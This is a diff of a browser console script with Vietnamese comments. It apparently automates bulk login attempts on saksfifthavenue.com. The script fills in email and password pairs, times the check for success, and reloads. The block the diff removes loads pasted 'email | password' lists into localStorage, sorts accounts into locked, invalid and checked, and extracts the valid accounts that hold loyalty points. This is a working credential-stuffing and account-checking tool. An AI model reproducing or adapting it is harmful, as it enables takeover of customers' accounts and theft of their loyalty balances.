@@ -64,7 +64,7 @@ function login(){
                 win.close()
 
             }
-        },3000) //  thoi gian cho truoc khi check xem login duoc hay khong, mac dinh 3s
+        },7000) //  thoi gian cho truoc khi check xem login duoc hay khong, mac dinh 7s
     }, 5000) // thoi gian cho trc khi dien mat khau va email de login, giam xuong neu muon tang toc, hien tai la 5s
     setTimeout(() => document.location.reload(), 10000);
 }
@@ -130,42 +130,3 @@ if(document.location.pathname.match(/\/v1\/account-service[^]*/)){
     document.location.href = 'https://www.saksfifthavenue.com/account/summary';
 
 }
-
-// init data copy cai nay paste vao console dau tien, nho dien data raw vao input_string
-var data_input = []
-
-var input_string = ''
-
-input_string = input_string.split(';');
-
-input_string.forEach((ele) => {
-
-    data_input.push(ele.split(' | '));
-
-})
-
-localStorage.setItem('data_input' , JSON.stringify(data_input));
-
-localStorage.setItem('data_lock' , JSON.stringify([]));
-
-localStorage.setItem('data_invalid' , JSON.stringify([]));
-
-localStorage.setItem('data_checked' , JSON.stringify([]));
-
-// cach lay data sau khi check
-
-var data_input = JSON.parse(localStorage.getItem('data_input'));
-
-var data_lock = JSON.parse(localStorage.getItem('data_lock'));
-
-var data_invalid = JSON.parse(localStorage.getItem('data_invalid'));
-
-var data_checked = JSON.parse(localStorage.getItem('data_checked'));
-
-checked_has_point = data_checked.filter(ele => {return ele.length ==3}); // lay ra nhung account da check ma co point;
-var string_need = '';
-checked_has_point.forEach(ele => {
-    string_need += ele[0] + ' | ' + ele[1] + ' | ' + (ele[2] == "" ? 0 : ele[2]) + ';'
-})
-string_need // chuoi can lay
-//lay chuoi nay sang file khac roi replace ';' bang dau '\n'
